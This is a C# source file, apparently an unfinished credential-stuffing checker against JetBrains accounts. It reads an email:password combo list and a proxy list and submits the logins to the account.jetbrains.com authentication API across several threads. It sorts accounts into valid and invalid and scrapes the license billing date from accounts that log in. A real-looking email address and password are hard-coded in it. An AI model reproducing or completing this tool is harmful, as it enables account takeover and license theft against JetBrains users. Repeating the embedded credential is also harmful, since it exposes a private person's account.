using System.Collections.Concurrent;
using System.Globalization;
using System.Net;
using System.Text;
using System.Text.Json;

namespace Jetbrains;

public struct AuthSessionResponse
{
    public string id { get; set; }
    public string flow { get; set; }
}

public struct EmailLoginRequest
{
    public string email { get; set; }
    public bool shouldValidateEmail { get; set; }
}

public struct PasswordLoginRequest
{
    public bool shouldValidateEmail { get; set; }
    public string email { get; set; }
    public string password { get; set; }
}

class Program
{
    private const string BaseUrl = "https://account.jetbrains.com";
    private const string AuthEmail = "moisey_b@yahoo.com";
    private const string AuthPassword = "psW_kmcv"; 
    
    private static int GoodAccouts = 0;
    private static int BadAccounts = 0; 
    
    static int TotalAccount = 0;
    static int TotalProxy = 0;
    
    private static int ComboIndex = 0; 
    private static int ProxyIndex = 0;
    
    static ConcurrentQueue<string> AccountsQueue = new ConcurrentQueue<string>();
    static ConcurrentQueue<string> ProxiesQueue = new ConcurrentQueue<string>();
    
    public static void Main(string[] args)
    {
        AccountLoader(out List<string> Accounts);     
        TotalAccount = Accounts.Count;
        Console.WriteLine(TotalAccount + " Accounts Loaded");
        AccountsQueue = new ConcurrentQueue<string>(Accounts);
        
        ProxyLoader(out List<string> Proxies);
        TotalProxy = Proxies.Count;
        Console.WriteLine(TotalProxy + " Accounts Loaded");
        ProxiesQueue = new ConcurrentQueue<string>(Proxies); 
        
        int MaximumThreads = 10;
        List<Task> tasks = new List<Task>();
        for(int i = 1; i <= MaximumThreads; i++)
        {
            tasks.Add(Task.Run(() => HandleAccounts()));
        }
        Task.WaitAll(tasks.ToArray());
         
        Console.WriteLine(ComboIndex + " ---- " + ProxyIndex);
    }
    // TODO
    static async Task HandleAccounts()
    {
        string Email = "";
        string Password = "";
        /*while (AccountsQueue.TryDequeue(out string Account) != false)
        {
            string[] AccountSplit = Account.Split(":");
            Email = AccountSplit[0];
            Password = AccountSplit[1];
            Interlocked.Increment(ref ComboIndex);
        }*/
         
        string proxy = ""; 
        while (ProxiesQueue.TryDequeue(out var Proxy) != false)    
        {
            Interlocked.Increment(ref ProxyIndex);
            proxy = Proxy;
            Console.WriteLine(ProxyIndex + "||" + Task.CurrentId + "||" + proxy);
        }
        // Console.WriteLine(Email + "---" + Password + "---" + proxy);
    }
    
    static void AccountLoader(out List<string> Accounts) 
    {
        Accounts = new List<string>();
        string CurrentLine = "";
        string ComboPath = "C:\\Clion Projects\\jetbrains Refactored\\Combo.txt";
        StreamReader ComboReader= new StreamReader(ComboPath);
        
        while ((CurrentLine = ComboReader.ReadLine()) != null)
        {
            Accounts.Add(CurrentLine);
        }
    }
    
    static void ProxyLoader(out List<string> Proxies)    
    {
        Proxies = new List<string>();
        string CurrentLine = "";
        string ProxyPath = "C:\\Clion Projects\\jetbrains Refactored\\Proxy.txt";
        StreamReader ProxyReader = new StreamReader(ProxyPath); 
        
        while ((CurrentLine = ProxyReader.ReadLine()) != null)
        {
            Proxies.Add(CurrentLine);
        }
    }
    static async Task HandleAuthenticationFlow(string Email ,string Password ,string Proxy)
    {
        using var client = CreateHttpClient(out var cookieContainer);
        
        // First get request to get JBA cookie
        await client.GetStringAsync($"{BaseUrl}/login?reauthenticate=false");
        var authCookie = GetCookieByIndex(cookieContainer, 0);
        
        // Getting SessionID 
        var sessionId = await CreateAuthSession(client, authCookie);
        
        // Email Request 
        var emailResponse = await ExecuteEmailLogin(client, authCookie, sessionId);
        if (BadEmail(emailResponse) == true)
        {
            BadAccounts++; 
            return;
        } 
        
        // password Request 
        var LoginResponse = await ExecutePasswordLogin(client, authCookie, sessionId);
        if (BadPassword(LoginResponse) == true) 
        {
            BadAccounts++;
            return;
        } 
        
        // Account Info + Expiration Date => TODO
        var AccountInfo = await CheckLicenseStatus(client, cookieContainer);
        GoodAccouts++;
        Console.WriteLine(AccountInfo);
    }
    
    static HttpClient CreateHttpClient(out CookieContainer cookieContainer)
    {
        cookieContainer = new CookieContainer();
        var handler = new HttpClientHandler
        {
            UseCookies = true,
            CookieContainer = cookieContainer
        };
        return new HttpClient(handler);
    }
    
    static async Task<string> CreateAuthSession(HttpClient client, Cookie authCookie)
    {
        var request = new HttpRequestMessage(HttpMethod.Post, $"{BaseUrl}/api/auth/sessions")
        {
            Content = new StringContent("", Encoding.UTF8, "application/json")
        };
        
        AddAuthHeaders(request, authCookie);
        var response = await client.SendAsync(request);
        return ParseSessionId(await response.Content.ReadAsStringAsync());
    }
    
    static async Task<string> ExecuteEmailLogin(HttpClient client, Cookie authCookie, string sessionId)
    {
        var emailRequest = new HttpRequestMessage(HttpMethod.Post,
            $"{BaseUrl}/api/auth/sessions/{sessionId}/email/login")
        {
            Content = new StringContent(
                JsonSerializer.Serialize(new EmailLoginRequest
                {
                    email = AuthEmail,
                    shouldValidateEmail = false
                }),
                Encoding.UTF8,
                "application/json")
        };
        
        AddAuthHeaders(emailRequest, authCookie);
        var response = await client.SendAsync(emailRequest);
        return await response.Content.ReadAsStringAsync();
    }
    static bool BadEmail(string emailResponse)
    {
        if (emailResponse.Contains("We couldn't find") ||
            emailResponse.Contains("InvalidEmail") ||
            emailResponse.Contains("AccountNotFound"))
        {
            Console.WriteLine("Bad Email");
            return true;
        }
        {
            Console.WriteLine("Bad Email");
            return false;
        }
    }
    
    static async Task<string> ExecutePasswordLogin(HttpClient client, Cookie authCookie, string sessionId)
    {
        var passwordRequest = new HttpRequestMessage(HttpMethod.Post,
            $"{BaseUrl}/api/auth/sessions/{sessionId}/password")
        {
            Content = new StringContent(
                JsonSerializer.Serialize(new PasswordLoginRequest
                {
                    email = AuthEmail,
                    password = AuthPassword,
                    shouldValidateEmail = false
                }),
                Encoding.UTF8,
                "application/json")
        };
        
        AddAuthHeaders(passwordRequest, authCookie);
        var response = await client.SendAsync(passwordRequest);
        return await response.Content.ReadAsStringAsync();
    }
    
    static bool BadPassword(string response)
    {
        Console.WriteLine(response);
        
        if (response.Contains("authenticated"))
        {
            Console.WriteLine("Valid Account");
            return false;
        }
        else if (response.Contains("IncorrectPassword"))
        {
            Console.WriteLine("Invalid Account ===> wrong Password");
            return true;
        }
        else
        {
            Console.WriteLine("Invalid Account ===> Unknown Error");
            return true;
        }
    }
    
    static async Task<string> CheckLicenseStatus(HttpClient client, CookieContainer cookieContainer)
    {
        var licenseRequest = new HttpRequestMessage(HttpMethod.Get, $"{BaseUrl}/licenses");
        licenseRequest.Headers.Add("Cookie", GetAllCookiesString(cookieContainer));
        
        var response = await client.SendAsync(licenseRequest);
        var body = await response.Content.ReadAsStringAsync();
         
        string date = ParseDateByPrefixSuffix(body,"<div class=\"well-label\">Billing date:</div>", "</span>");     
        string AccountInfo = "Email = " + AuthEmail +  " || "+  "Password = "  + AuthPassword + " || Expiration Date = " + date;
        return AccountInfo;
    }
    
    static string ParseDateByPrefixSuffix(string html, string prefix, string suffix)
    {
        int prefixIndex = html.IndexOf(prefix);
        if (prefixIndex == -1) return null;
        
        int start = prefixIndex + prefix.Length +  74;
        
        int suffixIndex = html.IndexOf(suffix, start);
        if (suffixIndex == -1) return null;
        
        string Date = html.Substring(start, suffixIndex - start);
        
        return Date; 
    }
    
    static void AddAuthHeaders(HttpRequestMessage request, Cookie authCookie)
    {
        var cookieString = $"{authCookie.Name}={authCookie.Value}";
        request.Headers.Add("Cookie", cookieString);
        request.Headers.Add("X-XSRF-TOKEN", authCookie.Value);
    }
    
    static string GetAllCookiesString(CookieContainer container)
    {
        return string.Join("; ", container.GetAllCookies().Cast<Cookie>());
    }
    
    static Cookie GetCookieByIndex(CookieContainer container, int index)
    {
        return container.GetAllCookies().Cast<Cookie>().ElementAt(index);
    }
    
    static string ParseSessionId(string responseBody)
    {
        return JsonSerializer.Deserialize<AuthSessionResponse>(responseBody).id;
    }
}